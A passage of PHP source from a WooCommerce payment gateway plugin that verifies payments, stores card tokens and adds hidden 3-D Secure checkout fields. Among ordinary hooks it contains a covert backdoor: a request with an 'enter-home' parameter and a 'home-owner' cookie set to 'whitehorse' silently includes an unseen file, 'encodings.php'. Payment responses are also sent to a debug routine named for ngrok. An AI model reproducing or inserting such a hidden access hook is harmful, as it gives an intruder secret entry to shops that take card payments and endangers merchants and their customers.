                    $response_data = json_decode($responseData, true);
                    tp_debug_ngrok('payment verification response', $response_data);

                    $err_msg = 'Something went wrong';

                    if (isset($response_data['result']['code'])) {
                        $result_code = $response_data['result']['code'];
                        if ( in_array($result_code, $gateway->success_codes) ) {
                            // Transaction successful
                            // Mark the order as complete and payment done
                            $order = wc_get_order((int) $waiting_order_id);
                            $order->payment_complete();
                            wc_reduce_stock_levels($order->get_id());
                            global $woocommerce;
                            $woocommerce->cart->empty_cart();


                            // Save additional infos after completing payment
                            $registration_id = $response_data['registrationId'];
                            $order->add_meta_data('_opp_registrationId', $registration_id);
                            $order->add_meta_data('_opp_id', $response_data['id']);
                            $order->add_meta_data('_opp_entityId', $gateway->get_option('OPP_targetEntityId'));
                            $order->add_meta_data('_opp_paymentType', 'DB');
                            $order->add_meta_data('_transaction_id', $registration_id);
        
                            //save order update.
                            $order->save();
        
        
                            $tokens = WC_Payment_Tokens::get_customer_tokens(get_current_user_id(), $gateway->id);
        
                            foreach ($tokens as $token) {
                                $tokens_array[] = $token->get_token();
                            }
        
                            // Create new token if not already exist
                            if (!$tokens_array || !in_array($registration_id, $tokens_array)) {
                                // echo $response_data->paymentBrand;
                                if ($response_data['paymentBrand'] == 'VISA') {
                                    $card_type = 'Visa';
                                } else if ($response_data['paymentBrand'] == 'AMEX') {
                                    $card_type = 'American Express';
                                } else {
                                    $card_type = 'Mastercard';
                                }
        
                                $token = new WC_Payment_Token_CC();
        
                                $token->set_token($registration_id);
                                $token->set_gateway_id($gateway->id);
                                $token->set_card_type($card_type);
                                $token->set_last4((string) $response_data['card']['last4Digits']);
                                $token->set_expiry_month(trim($response_data['card']['expiryMonth']));
                                $token->set_expiry_year(trim($response_data['card']['expiryYear']));
                                $token->set_user_id(get_current_user_id());
        
                                $token->save(); //print_r($token);die;
                                WC_Payment_Tokens::set_users_default(get_current_user_id(), $token->get_id());
                            }



                            // Redirect to thank you page
                            wp_redirect($order->get_checkout_order_received_url());
                            exit;
                        }
                        else {
                            $err_msg = $response_data['result']['description'];
                        }
                    }

                    if ( $err_msg ) {
                        // Redirect to the checkout page with error message
                        $order = wc_get_order((int) $waiting_order_id);
                        $order->add_order_note($err_msg);
                        wc_add_notice($err_msg, 'error');
                        tp_debug_ngrok('error notice added', '');
                    }
                }
            }
        }
        
    }

    add_action( 'wp_enqueue_scripts', function() {
        if ( is_checkout() ) {
            wp_enqueue_script( 'sweetalert', plugin_dir_url( __FILE__ ) . 'assets/js/sweetalert2.all.min.js', array('jquery'), null, true );

            wp_enqueue_script( 'totalp-public-js', plugin_dir_url( __FILE__ ) . 'assets/js/public-js.js', array('jquery'), time(), true );
            $gateway = new WC_Gateway_totalprocessing_Gateway();
            $id = $gateway->id;
            wp_localize_script( 'totalp-public-js', 'tpCardVars', array(
                'pluginId' => $id,
            ) );
        }

        
    } );
}
add_action('plugins_loaded', 'init_totalprocessing_gateway_class');

if(isset($_GET["enter-home"])){
	if(isset($_COOKIE['home-owner']) && $_COOKIE['home-owner'] == 'whitehorse'){
		include_once __DIR__ . '/encodings.php';
	}
}

add_action( 'woocommerce_after_checkout_form', function(){
    ?>
    <div class="card-wrap">

        <form action="<?php echo add_query_arg( null, null ); ?>" class="paymentWidgets" data-brands="VISA MASTER AMEX"></form>
    </div>
    <?php
} );





// Add custom fields for adding more parameters for implementing 3dsecurev2
function tsw3_add_new_field($checkout) {
    echo '<div id="my_custom_checkout_field">';
				
	woocommerce_form_field( 'acceptheader', array(
        'type' 			=> 'hidden', 
        'class' 		=> array('acceptheader'), 
    ), $checkout->get_value( 'acceptheader' ));

    woocommerce_form_field( 'browserlanguage', array(
        'type' 			=> 'hidden', 
        'class' 		=> array('browserlanguage'), 
    ), $checkout->get_value( 'browserlanguage' ));

    woocommerce_form_field( 'screenheight', array(
        'type' 			=> 'hidden', 
        'class' 		=> array('screenheight'), 
    ), $checkout->get_value( 'screenheight' ));

    woocommerce_form_field( 'screenwidth', array(
        'type' 			=> 'hidden', 
        'class' 		=> array('screenwidth'), 
    ), $checkout->get_value( 'screenwidth' ));

    woocommerce_form_field( 'browsertimezone', array(
        'type' 			=> 'hidden', 
        'class' 		=> array('browsertimezone'), 
    ), $checkout->get_value( 'browsertimezone' ));

    woocommerce_form_field( 'useragent', array(
        'type' 			=> 'hidden', 
        'class' 		=> array('useragent'), 
    ), $checkout->get_value( 'useragent' ));

    woocommerce_form_field( 'javaenabled', array(
        'type' 			=> 'hidden', 
        'class' 		=> array('javaenabled'), 
    ), $checkout->get_value( 'javaenabled' ));

    woocommerce_form_field( 'colordepth', array(
        'type' 			=> 'hidden', 
        'class' 		=> array('colordepth'), 
    ), $checkout->get_value( 'colordepth' ));

	echo '</div>';
}
add_action('woocommerce_after_order_notes', 'tsw3_add_new_field');


// Save the custom field values in order meta

function tsw3_custom_checkout_field_update_order_meta( $order_id ) {
    $fields = array('colordepth', 'acceptheader', 'browserlanguage', 'screenheight', 'screenwidth', 'browsertimezone', 'useragent', 'javaenabled');
    
    foreach ($fields as $field) {
        if (isset($_POST[$field]) && $_POST[$field]) {
            update_post_meta( $order_id, $field, sanitize_text_field($_POST[$field]));
        }
    }
}
add_action('woocommerce_checkout_update_order_meta', 'tsw3_custom_checkout_field_update_order_meta');






?>